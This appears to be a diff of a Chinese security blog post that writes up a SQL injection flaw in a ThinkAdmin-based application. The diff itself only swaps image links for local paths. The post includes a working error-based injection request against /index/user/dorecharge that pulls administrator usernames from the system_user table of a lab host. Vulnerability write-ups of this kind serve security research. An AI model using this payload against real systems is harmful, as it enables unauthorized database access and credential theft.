@@ -48,7 +48,7 @@ schema_version: "1"
 
 原创 Mstir  星悦安全   2025-07-21 06:40  
   
-![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
+![图片](../../.resource/remote/a1e5fc8e9cb802709e046b5e5c431d484839d8ece47637b62553d23860ae50a9.webp "")  
   
 点击上方  
 蓝字  
@@ -60,17 +60,17 @@ schema_version: "1"
   
 **fofa指纹 : 在文末!**  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ff2nTGAicZxYPDKkW7NaujwXEalmXLlib31pdaAZrGKuZEnyeQlLy12VBYQvmb3Z3YRyCicrQJ2lbibA/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/bc1fcc6bb34d6f52e3f78e73282a800cfcb8e474237431e3e8fca08e20c141bb.png "")  
   
 前端:  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ff2nTGAicZxYPDKkW7NaujwiaHutrNB2GHpC450iaxfJiazlia252I0xNA8DxicXPEpe3jYKSXeojqyyPw/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/19c5e18220670085bf995e77a72a8178607d1fe7faa4ecc5a50b2ef090eb9f15.png "")  
   
-![image.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5ff2nTGAicZxYPDKkW7NaujweYckorEUjIRc9IHoGRBKibTzMk2JnianicrxapI8ibTThhvuAqYY0vXvxA/640?wx_fmt=other&from=appmsg "")  
+![image.png](../../.resource/remote/4b502282159be18e83504ab20c26f5b0c595b03d9acba012f96790f7b1e74324.jpg "")  
   
 后端:  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ff2nTGAicZxYPDKkW7NaujwhjnphG0ZF8oQCSr02mwAnwFhl4tEWxVDibs3HXVq97XKEIttl9aIaqA/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/1e600d39f273cd911d10f17ca6f7710d5dd9200fbb639f05f8802b0a3c287de3.png "")  
   
 框架:ThinkAdmin Debug:True  
 ### 0x01 漏洞分析&复现  
@@ -89,7 +89,7 @@ POST /index/user/dorecharge HTTP/1.1Accept: text/html,application/xhtml+xml,appl
 ```  
   
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5ff2nTGAicZxYPDKkW7NaujwpDdr2Z1CDlxrCg5pp0omLeo0tcdqmnGflxapn15E8qvr3fgzqMH6Ig/640?wx_fmt=other&from=appmsg "")  
+![](../../.resource/remote/1bffa4e0e72a91f7ad1dee114b538e6e40fb242a02edc87880cc5321c3954bca.jpg "")  
 跑出管理员账户：  
 ```http
 POST /index/user/dorecharge HTTP/1.1Content-Length: 154Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7Cache-Control: max-age=0Content-Type: application/x-www-form-urlencodedCookie: s47696c33=9v1raoo6lcnhpshrs9p1elfr82; think_var=hkHost: 192.168.140.128Origin: http://192.168.140.128Referer: http://192.168.140.128/index/user/dorechargeUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36Connection: closetype=GTID_SUBSET(CONCAT((SELECT MID((IFNULL(CAST(username AS NCHAR),0x20)),1,190) FROM `fast`.`system_user` ORDER BY username LIMIT 0,1)),9985)&money=1222
